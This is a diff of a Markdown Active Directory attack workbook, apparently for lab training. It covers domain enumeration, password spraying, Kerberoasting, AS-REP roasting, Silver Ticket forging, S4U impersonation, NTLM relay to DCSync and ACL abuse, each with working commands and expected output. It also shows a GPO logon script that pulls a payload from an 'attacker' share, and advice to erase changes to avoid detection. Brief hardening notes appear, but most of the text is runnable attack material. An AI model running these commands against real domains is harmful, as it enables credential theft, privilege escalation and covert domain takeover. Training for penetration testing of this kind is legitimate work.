-    Connecting to LDAP or PowerShell AD cmdlets using a valid username and password (e.g., `User1 / Pass123`) to access information beyond what anonymous binds allow.
-    
--   **User Object**  
-    Represents a person in AD. Key attributes include `sAMAccountName` (username), `mail`, `title`, and `manager`.
-    
--   **Group Object**  
-    Collections of users. Groups like `Domain Admins` grant special privileges; listing members shows who holds those rights.
-    
--   **Computer Object**  
-    Represents a machine joined to the domain. Knowing OS and name helps identify targets for further attacks.
-    
-
-
-
-### Tools & Commands
-
--   **ldapsearch** (Kali Linux) – Query AD over LDAP with credentials
-    
-    ```bash
-    ldapsearch -x -H ldap://dc1.lab.local \
-      -D "LAB\User1" -w Pass123 \
-      -b "DC=lab,DC=local" \
-      "(objectCategory=person)" sAMAccountName,mail,title,manager
-    
-    ```
-    
-    _Expected Output Snippet:_
-    
-    ```text
-    sAMAccountName: jdoe
-    mail: jdoe@lab.local
-    title: Finance Analyst
-    manager: CN=Jane Smith,OU=Users,DC=lab,DC=local
-    
-    ```
-    
--   **Get-ADGroupMember** (PowerShell) – List members of a group
-    
-    ```powershell
-    Import-Module ActiveDirectory
-    Get-ADGroupMember -Identity "Domain Admins" | Select Name,SamAccountName
-    
-    ```
-    
-    _Expected Output Snippet:_
-    
-    ```text
-    Name            SamAccountName
-    ----            ----
-    Lab Admin User  labadmin
-    
-    ```
-    
--   **Get-ADComputer** (PowerShell) – Enumerate computer accounts
-    
-    ```powershell
-    Get-ADComputer -Filter * -Properties OperatingSystem | Select Name,OperatingSystem
-    
-    ```
-    
-    _Expected Output Snippet:_
-    
-    ```text
-    Name        OperatingSystem
-    ----        -----
-    DC1         Windows Server 2019
-    WORKSTN1    Windows 10 Pro
-    
-    ```
-    
-
-
-
-### Step-by-Step Guide
-
-1.  **Perform an authenticated LDAP query for users**
-    
-    ```bash
-    ldapsearch -x -H ldap://dc1.lab.local \
-      -D "LAB\User1" -w Pass123 \
-      -b "DC=lab,DC=local" \
-      "(objectCategory=person)" sAMAccountName,mail,title,manager
-    
-    ```
-    
-    _What to look for:_ Usernames with emails and job titles, showing roles and reporting chains.
-    
-2.  **List Domain Admins group members**
-    
-    ```powershell
-    Get-ADGroupMember -Identity "Domain Admins" | Select Name,SamAccountName
-    
-    ```
-    
-    _What to look for:_ Names of high-privilege accounts you may target later.
-    
-3.  **Enumerate all computer accounts**
-    
-    ```powershell
-    Get-ADComputer -Filter * -Properties OperatingSystem | Select Name,OperatingSystem
-    
-    ```
-    
-    _What to look for:_ Servers vs workstations to prioritize attacks.
-    
-
-
-
-### Expected Result
-
--   A list of user accounts with key attributes for profiling.
-    
--   Identification of privileged group members.
-    
--   Inventory of computers and their OS versions.
-    
-
-
-
-### Mitigation & Hardening
-
--   **Limit LDAP read permissions**: Allow only necessary users to perform directory queries.
-    
--   **Audit and monitor** credentialed queries, especially group membership and computer enumeration.
-    
-
-
-
-### Next Steps
-
--   **Attack Type:** Reconnaissance → Privilege Escalation
-    
--   **Attack Path:**
-    
-    1.  Use user attributes to identify high-value targets.
-        
-    2.  Move to **Enumerating Security Controls** to check ACLs and GPOs next.
-        
-
-
-
-
-## <a name="module-8"></a> Module 8: Enumerating Security Controls (GPOs, ACLs, AD CS, AEP)
-
-_Detect and analyze the policies, permissions, and security settings protecting Active Directory._
-
-### Key Concepts
-
--   **Group Policy Object (GPO)**  
-    A GPO is a rulebook you attach to groups of users or computers (OUs). It automatically applies settings like password policies, user rights, and scripts. For example, if **"Allow log on locally"** is granted to **Everyone**, any user can log on to domain machines—a dangerous misconfiguration.
-    
--   **Access Control List (ACL)**  
-    AD objects (users, groups, OUs) have ACLs listing who can do what:
-    
-    -   **GenericAll**: Full control over the object and its children (read, modify, delete).
-        
-    -   **GenericRead**: View all properties and list child objects.
-        
-    -   **GenericWrite**: Modify all properties and create child objects.
-        
-    -   **ReadProperty** / **WriteProperty**: Read or modify specific attributes (e.g., `userAccountControl`).
-        
-    -   **Delete**: Remove the object.
-        
-    -   **WriteDacl**: Change the ACL itself—adding or removing ACEs.
-        
-    -   **WriteOwner**: Change the owner of the object.
-        
-    -   **InheritanceType: All**: The permission applies to child objects as well.
-        
--   **AD CS (Certificate Services) & Templates**  
-    Active Directory Certificate Services (AD CS) provides Public Key Infrastructure (PKI) within AD. Certificates are digital IDs issued to users, computers, or services to enable strong authentication and secure communications.
-    
-    -   **Why certificates are used**: They allow password-less authentication, encrypt LDAP traffic (LDAPS), and support smart-card logon via **PKINIT**.
-        
-    -   **PKINIT (Public Key Cryptography for Initial Authentication in Kerberos)**: An extension to Kerberos that uses certificates instead of (or in addition to) passwords for the initial ticket-granting request. Think of it as showing a secure badge rather than reciting a secret phrase.
-        
-    -   **Certificate Templates** define who can request, autoenroll, or manage certificates. Misconfigurations include:
-        
-        -   **Authenticated Users with Enroll**: Any user can request certificates, leading to unauthorized access.
-            
-        -   **Autoenroll for broad groups**: Persistent certificates issued without admin oversight.
-            
-        -   **Excessive Manage/Full Control rights**: Attackers can modify templates to weaken security (e.g., allow issuance of CA certificates).
-            
--   **Advanced Encryption Policy (AEP)**  
-    Domain-wide settings enforcing strong cryptography:
-    
-    -   **AES-only Kerberos**: Forces ticket encryption with AES.
-        
-    -   **LDAPS Sign/Channel Binding**: Ensures LDAP sessions cannot be tampered with.
-        
-
-
-
-### Tools & Commands
-
--   **Get-GPOReport** – Export all GPOs to HTML
-    
-    ```powershell
-    Import-Module GroupPolicy
-    Get-GPOReport -All -ReportType HTML -Path AllGPOs.html
-    
-    ```
-    
-    _Expected Output Snippet (search for “Allow log on locally”):_
-    
-    ```html
-    <Setting Name="Allow log on locally" Value="Everyone"/>
-    
-    ```
-    
--   **Get-ObjectAcl** – View ACLs and understand ACEs
-    
-    ```powershell
-    Get-ObjectAcl -DistinguishedName "OU=Admins,DC=lab,DC=local" -ResolveGUIDs | FL
-    
-    ```
-    
-    _Expected Output Snippet:_
-    
-    ```text
-    IdentityReference      : LAB\\AdminsGroup
-    ActiveDirectoryRights  : GenericAll
-    InheritanceType        : All
-    
-    ```
-    
--   **certutil** – Inspect certificate-template permissions
-    
-    ```powershell
-    certutil -view -restrict "Certificate Template=DomainController"
-    
-    ```
-    
-    _Expected Output Snippet:_
-    
-    ```text
-    Template Name: DomainController
-    Permissions  : Authenticated Users (Read, Enroll), Domain Admins (Full Control)
-    
-    ```
-    
--   **nltest** – Verify LDAPS signing and channel binding enforcement
-    
-    ```bat
-    nltest /sc_query:LAB
-    
-    ```
-    
-    _Expected Output Snippet:_
-    
-    ```text
-    Flags: 0x10000 (SEAL)
-    
-    ```
-    
-
-
-
-### Step-by-Step Guide
-
-1.  **Export GPO settings**
-    
-    ```powershell
-    Get-GPOReport -All -ReportType HTML -Path AllGPOs.html
-    
-    ```
-    
-    _Check the HTML for misconfigurations like broad “Allow log on locally” assignments._
-    
-2.  **Analyze ACLs on critical objects**
-    
-    ```powershell
-    Get-ObjectAcl -DistinguishedName "OU=Finance,DC=lab,DC=local" -ResolveGUIDs | FL
-    
-    ```
-    
-    _Look for `ActiveDirectoryRights : GenericAll` or `WriteDacl`._
-    
-3.  **Review certificate template permissions**
-    
-    ```powershell
-    certutil -view -restrict "Certificate Template=User"
-    
-    ```
-    
-    _Verify only intended security groups have Enroll/Autoenroll._
-    
-4.  **Confirm LDAP signing/channel binding**
-    
-    ```bat
-    nltest /sc_query:LAB
-    
-    ```
-    
-    _Ensure `SEAL` is present in flags._
-    
-
-
-
-### Expected Result
-
--   Identification of overly permissive GPO entries.
-    
--   Detection of dangerous ACL rights on AD objects.
-    
--   Discovery of certificate templates with insecure enrollment permissions.
-    
--   Confirmation that LDAP signing/channel binding is enforced.
-    
-
-
-
-### Exploitation When Misconfigured
-
--   **Allow log on locally = Everyone**: Deploy malicious GPO logon script as SYSTEM
-    
-    ```powershell
-    Set-GPRegistryValue -Name "VulnGPO" -Key "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\Scripts\\Logon" -ValueName "0" -Type String -Value "powershell -exec bypass -File \\\"\\\\attacker\\\\payload.ps1\\\""
-    
-    ```
-    
--   **GenericAll / WriteDacl**: Add attacker to Domain Admins
-    
-    ```powershell
-    Add-ADGroupMember -Identity "Domain Admins" -Members "AttackerUser"
-    
-    ```
-    
--   **Authenticated Users Enroll**: Request and use user certificate for PKINIT
-    
-    ```powershell
-    certreq -submit -attrib "CertificateTemplate:User" user.inf user.cer
-    kinit -k -t user.cer user@LAB.LOCAL
-    
-    ```
-    
--   **Missing LDAPS signing**: Relay NTLMv2 to LDAP for DCSync
-    
-    ```bash
-    ntlmrelayx.py -t ldap://dc1.lab.local --escalate-method drsuapi
-    
-    ```
-    
-
-
-
-### Mitigation & Hardening
-
--   Remove “Allow log on locally” from Everyone.
-    
--   Strip GenericAll/WriteDacl from non-admins.
-    
--   Restrict certificate-template Enroll/Autoenroll.
-    
--   Enforce LDAP signing/channel binding via GPO.
-    
-
-
-
-### Next Steps
-
--   Use misconfigurations to gain SYSTEM or Domain Admin.
-    
--   Clean up persistent GPO and ACL changes to reduce detection.
-    
-
-
-## <a name="module-9"></a> Module 9: Password Spraying (Building Target Lists; Linux & Windows)
-
-_Refine user lists and perform password spraying from both Linux and Windows platforms._
-
-### Key Concepts
-
--   **Password Spraying**  
-    Trying a single (or small set of) common password(s) against many accounts to avoid lockouts. Like testing the same key on many locks rather than many keys on one lock.
-    
--   **Target List**  
-    A curated list of usernames focused by role, group membership, or organizational unit—enabling more efficient attacks than blind spraying.
-    
--   **Account Lockout**  
-    A defense that temporarily blocks accounts after a threshold of failed attempts. Proper spraying stays below this threshold.
-    
--   **Credential Validation**  
-    Verifying that sprayed passwords worked, using protocols like LDAP bind or SMB authentication.
-    
-
-
-
-### Tools & Commands
-
--   **ldapsearch** (Kali Linux) – Build target lists via LDAP
-    
-    ```
-    ldapsearch -x -H ldap://dc1.lab.local \
-      -b "OU=Sales,DC=lab,DC=local" \
-      "(objectCategory=person)" sAMAccountName > targets.txt
-    ```
-    
-    _Expected Output Snippet (targets.txt):_
-    
-    ```
-    jdoe
-    asmith
-    mbrown
-    ```
-    
--   **CrackMapExec** (Linux/Windows) – Spray passwords via SMB/LDAP
-    
-    ```
-    # echo "Spring2025!" | cme ldap lab.local -u targets.txt --continue-on-success
-    ```
-
-### Windows example (PowerShell)
-
-cme ldap lab.local -u targets.txt -p "Spring2025!" --continue-on-success
+**Validate successful credentials:**
 
 ```
-_Expected Output Snippet:_
-```text
-[*] LAB\jdoe:Spring2025! (LDAP)  
-[*] LAB\asmith:Spring2025! (LDAP)
+nxc smb dc1.corp.local -u jdoe -p 'Spring2025!'
+nxc winrm dc1.corp.local -u jdoe -p 'Spring2025!'
 ```
 
+### Hardening
+
+- Lockout threshold ≤ 3 with 30+ minute duration.
+- Enforce MFA for all privileged accounts.
+- Monitor Event ID 4771 (Kerberos pre-auth failure) for spray patterns.
+- Use banned password lists (Azure AD Password Protection on-prem).
 
 
-### Step-by-Step Guide
+## Module 6: Kerberos Attacks
 
-1.  **Generate a focused target list**
-    
-    ```
-    ldapsearch -x -H ldap://dc1.lab.local \
-      -b "OU=IT,DC=lab,DC=local" \
-      "(objectClass=person)" sAMAccountName > targets.txt
-    ```
-    
-    _Result:_  `targets.txt` with IT department usernames.
-    
-2.  **Perform spraying on Linux**
-    
-    ```
-    cme ldap lab.local -u targets.txt -p "Autumn2025!" --continue-on-success
-    ```
-    
-    _Look for:_  `LAB\asmith:Autumn2025! (LDAP)` indicating success.
-    
-3.  **Perform spraying on Windows**
-    
-    ```
-    cme ldap lab.local -u targets.txt -p "Autumn2025!" --continue-on-success
-    ```
-    
-    _Look for:_ Successful bind entries similar to above.
-    
-4.  **Validate credentials**
-    
-    ```
-    smbclient -L \dc1.lab.local -U jdoe%Autumn2025!
-    ```
-    
-    _If you see share listings, the password is valid._
-    
+*Kerberoasting, AS-REP Roasting, Golden/Silver/Diamond Tickets, and S4U abuse.*
 
+### How Kerberos Works (Quick Summary)
 
+1. **AS-REQ** — Client sends username + encrypted timestamp to KDC.
+2. **AS-REP** — KDC returns a TGT (encrypted with `krbtgt` hash).
+3. **TGS-REQ** — Client presents TGT, requests access to a service (SPN).
+4. **TGS-REP** — KDC returns a Service Ticket (TGS), encrypted with the service account's hash.
+5. **AP-REQ** — Client presents TGS to the service for access.
 
-### Expected Result
+Attackers target steps 2 (AS-REP Roasting), 4 (Kerberoasting), and forge tickets at steps 2 (Golden) and 4 (Silver/Diamond).
 
--   A list of accounts that accepted the sprayed password in CrackMapExec output.
-    
--   Successful SMB share listings via valid credentials.
-    
+### 1. Kerberoasting
 
+Request TGS tickets for service accounts with SPNs, then crack them offline. The TGS is encrypted with the service account's password hash — weak passwords crack fast.
 
+**Impacket (Linux):**
 
-### Mitigation & Hardening
-
--   **Implement tighter lockout policies**: Lower threshold (e.g., 3 attempts) and longer lockout durations.
-    
--   **Enable Multi-Factor Authentication (MFA)** for all critical accounts.
-    
--   **Monitor for rapid failed logins** and alert on anomalies.
-    
-
-
-
-### Next Steps
-
--   **Attack Type:** Targeted Password Spraying → Credential Validation
-    
--   **Attack Path:**
-    
-    1.  Build and refine target lists via LDAP.
-        
-    2.  Spray common passwords with CME.
-        
-    3.  Validate valid credentials for deeper enumeration or persistence.
-- - - - - 
-## <a name="module-10"></a> Module 10: Enumerating Computers, SPN Delegation & Trust Relationships
-
-### Introduction  
-Find computer accounts, identify SPN delegation (Kerberoast, unconstrained, constrained, RBCD), and map trust relationships.
-
-### Definitions  
-1. **Computer Account**: AD object for a host; `sAMAccountName` ends with `$`.  
-2. **SPN Delegation**:  
-   - **Kerberoasting**: Obtain TGS for SPN encrypted with account password.  
-   - **Unconstrained Delegation**: `TRUSTED_FOR_DELEGATION` bit in `userAccountControl`.  
-   - **Constrained Delegation**: `msDS-AllowedToDelegateTo` attribute.  
-   - **RBCD**: `msDS-AllowedToActOnBehalfOfOtherIdentity`.  
-3. **Trust Relationship**: Link between domains; one-way or two-way.
-
-### Why It Matters  
-- SPNs yield offline cracking.  
-- Unconstrained delegation allows impersonation.  
-- Trusts can open the entire forest.
-
-### Tools & Commands  
-
-#### LDAP Queries  
-- All computers:  
-  ```bash
-  ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(objectCategory=computer)" sAMAccountName,operatingSystem,distinguishedName,servicePrincipalName,userAccountControl
-  ```  
-- SPN hosts:  
-  ```bash
-  ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(&(objectCategory=computer)(servicePrincipalName=*))" sAMAccountName,servicePrincipalName
-  ```  
-- Unconstrained delegation:  
-  ```bash
-  ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" sAMAccountName,distinguishedName,userAccountControl
-  ```  
-- Constrained delegation:  
-  ```bash
-  ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(&(objectCategory=computer)(msDS-AllowedToDelegateTo=*))" sAMAccountName,msDS-AllowedToDelegateTo
-  ```  
-- Trust relationships:  
-  ```bash
-  ldapsearch -x -H ldap://DC01.corp.local -b "CN=Configuration,DC=corp,DC=local" "(objectClass=crossRef)" nETBIOSName,dnsRoot,trustPartner,trustDirection
-  ```
-
-#### PowerShell  
-- All computers:  
-  ```powershell
-  Get-ADComputer -Filter * -Properties operatingSystem,servicePrincipalName,userAccountControl
-  ```  
-- SPN hosts:  
-  ```powershell
-  Get-ADComputer -Filter {servicePrincipalName -like "*"} -Properties servicePrincipalName
-  ```  
-- Unconstrained delegation:  
-  ```powershell
-  Get-ADComputer -Filter {userAccountControl -band 524288} -Properties userAccountControl
-  ```  
-- Constrained delegation:  
-  ```powershell
-  Get-ADComputer -Filter {msDS-AllowedToDelegateTo -like "*"} -Properties msDS-AllowedToDelegateTo
-  ```  
-- Trust relationships:  
-  ```powershell
-  Get-ADTrust -Filter * | Select Name,TrustType,Direction,Target
-  ```
-
-### Step-by-Step Guide  
-
-#### 1. Enumerate All Computers  
-```bash
-ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(objectCategory=computer)" sAMAccountName,operatingSystem,distinguishedName,servicePrincipalName,userAccountControl
 ```
-**Expected Output (partial)**:  
-```
-dn: CN=DC01,CN=Computers,DC=corp,DC=local
-sAMAccountName: DC01$
-operatingSystem: Windows Server 2022 Datacenter
-servicePrincipalName: GC/DC01.corp.local
-userAccountControl: 532480
-
-dn: CN=WS001,OU=Workstations,DC=corp,DC=local
-sAMAccountName: WS001$
-operatingSystem: Windows 10 Pro
-userAccountControl: 4096
-
-dn: CN=SRV-FS01,OU=FileServers,DC=corp,DC=local
-sAMAccountName: SRV-FS01$
-operatingSystem: Windows Server 2019 Standard
-userAccountControl: 528704
+impacket-GetUserSPNs -request -dc-ip dc1.corp.local corp.local/user1:'Pass123' -outputfile kerberoast.hash
 ```
 
-#### 2. Identify Kerberoastable Hosts (SPNs)  
-```bash
-ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(&(objectCategory=computer)(servicePrincipalName=*))" sAMAccountName,servicePrincipalName
-```
-**Expected Output**:  
-```
-dn: CN=SRV-SQL01,OU=Servers,DC=corp,DC=local
-sAMAccountName: SRV-SQL01$
-servicePrincipalName: MSSQLSvc/sqlsrv.corp.local:1433
+**NetExec (one-liner):**
 
-dn: CN=SRV-SQL02,OU=Servers,DC=corp,DC=local
-sAMAccountName: SRV-SQL02$
-servicePrincipalName: MSSQLSvc/sql02.corp.local:1433, MSSQLSvc/sql02.corp.local
-
-dn: CN=SRV-EX01,OU=MailServers,DC=corp,DC=local
-sAMAccountName: SRV-EX01$
-servicePrincipalName: SMTP/ex01.corp.local
+```
+nxc ldap dc1.corp.local -u user1 -p 'Pass123' --kerberoasting kerberoast.hash
 ```
 
-#### 3. Identify Unconstrained Delegation Hosts  
-```bash
-ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" sAMAccountName,distinguishedName,userAccountControl
-```
-**Expected Output**:  
-```
-dn: CN=DC01,CN=Computers,DC=corp,DC=local
-sAMAccountName: DC01$
-userAccountControl: 532480
+**Rubeus (Windows):**
 
-dn: CN=SRV-FS01,OU=FileServers,DC=corp,DC=local
-sAMAccountName: SRV-FS01$
-userAccountControl: 528704
+```
+Rubeus.exe kerberoast /outfile:kerberoast.hash
 ```
 
-#### 4. Identify Constrained Delegation Hosts  
-```bash
-ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(&(objectCategory=computer)(msDS-AllowedToDelegateTo=*))" sAMAccountName,msDS-AllowedToDelegateTo
-```
-**Expected Output**:  
-```
-dn: CN=SRV-WEB01,OU=WebServers,DC=corp,DC=local
-sAMAccountName: SRV-WEB01$
-msDS-AllowedToDelegateTo: HTTP/sqlsrv.corp.local
+**Crack:**
 
-dn: CN=SRV-APP01,OU=AppServers,DC=corp,DC=local
-sAMAccountName: SRV-APP01$
-msDS-AllowedToDelegateTo: MSSQLSvc/sql02.corp.local:1433
+```
+hashcat -m 13100 kerberoast.hash wordlist.txt
 ```
 
-#### 5. Enumerate Trust Relationships  
-```bash
-ldapsearch -x -H ldap://DC01.corp.local -b "CN=Configuration,DC=corp,DC=local" "(objectClass=crossRef)" nETBIOSName,dnsRoot,trustPartner,trustDirection
-```
-**Expected Output**:  
-```
-dn: CN=SALES,DC=Configuration,DC=corp,DC=local
-nETBIOSName: SALES
-dnsRoot: sales.corp.local
-trustPartner: CORP.corp.local
-trustDirection: 3
+**Targeted Kerberoast (specific user):**
 
-dn: CN=DEV,DC=Configuration,DC=corp,DC=local
-nETBIOSName: DEV
-dnsRoot: dev.corp.local
-trustPartner: CORP.corp.local
-trustDirection: 2
+```
+impacket-GetUserSPNs -request -dc-ip dc1.corp.local corp.local/user1:'Pass123' -request-user svc_sql
 ```
 
-### Scenarios & Branching Logic  
-
-#### Scenario 1: Domain User  
-- Find SPN hosts → Kerberoast → crack → pivot.  
-- If no SPNs, find unconstrained delegation hosts → gain local access → impersonate DA.  
-
-#### Scenario 2: Local Admin on Workstation  
-- Dump cached creds → find DA creds → PtH/PtT → pivot.  
-- Check LAPS → retrieve local admin password → pivot.  
-- Check scheduled tasks → extract service creds → pivot.  
-
-#### Scenario 3: Domain Admin  
-- Already DA: focus on persistence (Module 11) and advanced credential theft (Module 9).  
-
-### Common Pitfalls  
-- LDAP returning stale computer accounts  
-- SPNs on offline hosts  
-- Misreading delegation flags  
-- Trust direction confusion  
-
-### Next Steps  
-- **Module 6**: ACL Misconfiguration Deep Dive & Shadow Admin Discovery  
-
----
-## <a name="module-11"></a> Module 11: Kerberos Attacks
-
-_A deep dive into Kerberos-based attacks and ticket abuses._
-
-### Key Concepts
-
--   **Kerberos**  
-    The core authentication protocol in AD. It issues time-limited tickets instead of sending passwords over the network.
-    
--   **Key Distribution Center (KDC)**  
-    The AD service on Domain Controllers that issues tickets. It has two parts: the Authentication Service (AS) and the Ticket Granting Service (TGS).
-    
--   **Ticket Granting Ticket (TGT)**  
-    A ticket you obtain once by authenticating (password or PKINIT). It allows you to request service tickets (TGS) without re-entering your credentials.
-    
--   **Ticket Granting Service (TGS) Ticket**  
-    A service-specific ticket encrypted with the service account’s key. Used to authenticate to that service.
-    
--   **Service Principal Name (SPN)**  
-    The unique name for a service (e.g., `HTTP/srv1.lab.local`). Kerberoasting targets SPN accounts to request TGS tickets.
-    
--   **Constrained Delegation**  
-    A setting that lets a service use your TGT to request TGS tickets for specific downstream services on your behalf. If misconfigured, attackers can perform a **double hop** attack to impersonate users across services.
-    
--   **Double Hop**  
-    The technique of using delegated credentials from one service to access another service, e.g., impersonate a user from a web server to a database server.
-    
--   **AS-REP Roasting**  
-    Targets accounts with Kerberos preauthentication disabled. Attackers request an AS-REP (initial TGT) without preauth, capture the encrypted response, and crack it offline to recover the password.
-    
--   **Silver Ticket**  
-    A forged TGS for a specific service created by encrypting the ticket with the service account’s NTLM hash. Bypasses the KDC entirely, used when the service account hash is known.
-    
--   **Golden Ticket**  
-    A forged TGT encrypted with the KRBTGT account hash. Grants unrestricted domain-wide access for its validity period.
-    
--   **PKINIT**  
-    An extension to Kerberos initial authentication that uses X.509 certificates instead of passwords to obtain a TGT.
-    
--   **S4U (Service for User)**  
-    Extensions allowing services to obtain tickets on behalf of users:
-    
-    -   **S4U2Self:** A service requests a TGS for a user without the user’s credentials.
-        
-    -   **S4U2Proxy:** A service uses its own TGS and an S4U2Self ticket to request a second TGS for another service.
-        
--   **Rubeus**  
-    A C# tool for Kerberos abuse: ticket requests (AS-REP, S4U), ticket renewal, Silver/Golden ticket forging, and harvesting.
-    
-
-
-
-### 1. Kerberoasting (Linux & Windows)
-
-_Request TGS tickets for service accounts tagged with SPNs and crack them offline to reveal their passwords._
-
-#### Deep Dive & Analogy
-
-Imagine a busy hotel (AD forest) where each guest (user) has a master keycard (TGT) issued at the front desk (KDC). To enter a specific room (service), you request a room-key (TGS) from the front desk. That key is encoded with the room’s lock combination (service account password). In Kerberoasting, you:
-
-![enter image description here](https://github.com/ShubhamDubeyy/Active-Directory-Workbook/blob/main/kerberoast.png?raw=true)
-
-Attackers skip step 4 and grab the encoded room-key (TGS) in step 3. They then try all possible room combinations (password guesses) offline until the key unlocks, revealing the service account’s password.
-
-#### Key Concepts
-
--   **Service Account**: A special account that services (like SQL, HTTP) use – akin to a hotel room’s lock code.
-    
--   **Service Principal Name (SPN)**: The official room number registered in the hotel directory (e.g., `HTTP/SRV1.lab.local`).
-    
--   **Ticket Granting Service (TGS)**: The encoded room-key for that SPN.
-    
--   **Offline Cracking**: Trying password guesses against the encrypted ticket without talking to the hotel staff (DC), avoiding alarms.
-    
-
-#### Tools & Commands
-
--   **GetUserSPNs.py** (Impacket)
-    
-    ```bash
-    # Step 1: Request TGS for all SPN accounts
-    GetUserSPNs.py -request -dc-ip dc1.lab.local lab.local/DOMAINUSER:Pass > spn.hashes
-    
-    ```
-    
-    _Expected Output_: `Hash for svc_http@LAB.LOCAL saved in spn.hashes`
-    
--   **hashcat**
-    
-    ```bash
-    # Step 2: Crack TGS hashes offline (mode 13100)
-    hashcat -m 13100 spn.hashes wordlist.txt
-    
-    ```
-    
-    _Expected Output_: `Recovered: svc_http:P@ssw0rd123`
-    
--   **kinit**
-    
-    ```bash
-    # Step 3: Validate cracked password by obtaining a TGT
-    kinit svc_http@LAB.LOCAL
-    
-    ```
-    
-    _Expected Output_: No error; new ticket in cache.
-    
-
-#### Step-by-Step Guide
-
-1.  **Discover SPN Accounts**
-    
-    ```bash
-    ldapsearch -x -H ldap://dc1.lab.local -b "DC=lab,DC=local" "(servicePrincipalName=*)" sAMAccountName,servicePrincipalName
-    
-    ```
-    
-    _Look for lines:_
-    
-    ```text
-    sAMAccountName: svc_http
-    servicePrincipalName: HTTP/SRV1.lab.local
-    
-    ```
-    
-2.  **Request TGS Tickets**
-    
-    ```bash
-    GetUserSPNs.py -request -dc-ip dc1.lab.local lab.local/DOMAINUSER:Pass > spn.hashes
-    
-    ```
-    
-    _Check_: `spn.hashes` contains encrypted tickets.
-    
-3.  **Offline Cracking**
-    
-    ```bash
-    hashcat -m 13100 spn.hashes wordlist.txt
-    
-    ```
-    
-    _Result_: Plaintext passwords, e.g., `svc_http:P@ssw0rd123`.
-    
-4.  **Validate Credentials**
-    
-    ```bash
-    kinit svc_http@LAB.LOCAL
-    
-    ```
-    
-    _Success Indicator_: No error; `klist` shows new TGT.
-    
-
-
-
-### 2. Kerberos Double Hop & Constrained Delegation
-
-_Exploit services configured to delegate on behalf of users._
-
-#### Tools & Commands
-
--   **Get-DomainObject** (PowerView)
-    
-    ```powershell
-    # List services with constrained delegation
-    Import-Module .\PowerView.ps1
-    Get-DomainObject -SearchBase "OU=Services,DC=lab,DC=local" -LDAPFilter "(msDS-AllowedToDelegateTo=*)" -Properties msDS-AllowedToDelegateTo
-    
-    ```
-    
-    _Expected Output:_ Lists service accounts and allowed SPNs.
-    
--   **Rubeus**
-    
-    ```powershell
-    # Perform S4U2Self to get TGS for target user
-    Rubeus.exe s4u /user:svc_http /impersonateuser:Administrator /service:HTTP/srv1.lab.local
-    
-    ```
-    
-    _Expected Output:_ A new TGS ticket for Administrator is injected into cache.
-    
-
-#### Step-by-Step
-
-1.  Identify services with constrained delegation.
-    
-2.  Use Rubeus S4U2Self to request a TGS as Administrator.
-    
-3.  Access service as Administrator without AD credentials.
-    
-
-
-
-### 3. AS-REP Roasting & Silver Ticket Attacks
-
-_Extract AS-REP hashes and forge service tickets._
-
-#### Tools & Commands
-
--   **GetNPUsers.py** (Impacket)
-    
-    ```bash
-    # Extract AS-REP hashes
-    GetNPUsers.py -dc-ip dc1.lab.local lab.local/ -no-pass > asrep.hashes
-    
-    ```
-    
-    _Expected Output:_ Lines like `svc_backup:...`
-    
--   **hashcat**
-    
-    ```bash
-    hashcat -m 18200 asrep.hashes wordlist.txt
-    
-    ```
-    
-    _Expected Output:_ `Recovered: svc_backup:MyBackupPass`
-    
--   **Rubeus** (Silver Ticket)
-    
-    ```powershell
-    # Forge Silver Ticket for HTTP service
-    Rubeus.exe silver /domain:lab.local /sid:S-1-5-21... /rc4:ServiceAccountNTLMHash /service:HTTP/srv1.lab.local /target:SRV1
-    
-    ```
-    
-    _Expected Output:_ `Ticket \\srv1\HTTP injected into kerb cache successfully`
-    
-
-#### Step-by-Step
-
-1.  AS-REP Roasting: find preauth-disabled accounts, extract and crack.
-    
-2.  Silver Ticket: use known service hash to forge TGS.
-    
-3.  Authenticate to the service using the forged ticket.
-    
-
-
-
-### Expected Result
-
--   Plaintext passwords for service and no-preauth accounts.
-    
--   Active S4U TGS for privileged users.
-    
--   Forged Silver Tickets in cache enabling service access.
-    
-
-
-
-### Mitigation & Hardening
-
--   Enforce Kerberos preauthentication for all accounts.
-    
--   Disable unconstrained or restricted delegation where not required.
-    
--   Monitor for anomalous S4U requests and ticket usage.
-    
--   Rotate service and krbtgt passwords regularly.
-    
-
-
-
-### References
-
-1.  [Kerberoasting Explained](https://adsecurity.org/?p=1438)
-    
-2.  [Rubeus Documentation](https://github.com/GhostPack/Rubeus)
-    
-3.  [Impacket Toolkit](https://github.com/SecureAuthCorp/impacket)
-    
-- - - 
-## <a name="module-12"></a> Module 12: ACL & DCSync Abuse
-
-_Understand how to abuse AD’s permission model and replication features._
-
-### Key Concepts
-
--   **Access Control List (ACL)**  
-    Each AD object has an ACL: a list of who can do what. Permissions (ACEs) include:
-    
-    -   **GenericAll**: Full control—read, write, delete, and modify permissions.
-        
-    -   **GenericWrite**: Modify object properties and add child objects.
-        
-    -   **WriteDacl**: Change the ACL itself—add or remove ACEs.
-        
-    -   **Replicating Directory Changes** (`DS-Replication-Get-Changes`): Permission to pull password hashes via DCSync.
-        
--   **DCSync**  
-    Abuse of the `Replicating Directory Changes` ACL to request password hashes directly from a DC, as if you were a DC. No plaintext password needed.
-    
--   **DCShadow**  
-    A stealthy replication attack where you register a rogue domain controller and push changes (e.g., new admin account) back to the real DCs without detection.
-    
-
-
-
-### ACL Enumeration Techniques
-
-_Discover who holds powerful permissions on AD objects._
-
-#### Tools & Commands
-
--   **Get-ObjectAcl** (PowerShell)
-    
-    ```powershell
-    # Enumerate ACLs on an OU or object
-    Get-ObjectAcl -DistinguishedName "OU=Protected,DC=lab,DC=local" -ResolveGUIDs | Format-Table IdentityReference,ActiveDirectoryRights
-    
-    ```
-    
-    _Expected Output:_
-    
-    ```text
-    IdentityReference    ActiveDirectoryRights
-    -------    -
-    LAB\\AdminGroup     GenericAll
-    LAB\\BackupOps     DS-Replication-Get-Changes
-    
-    ```
-    
--   **BloodHound** (CLI)
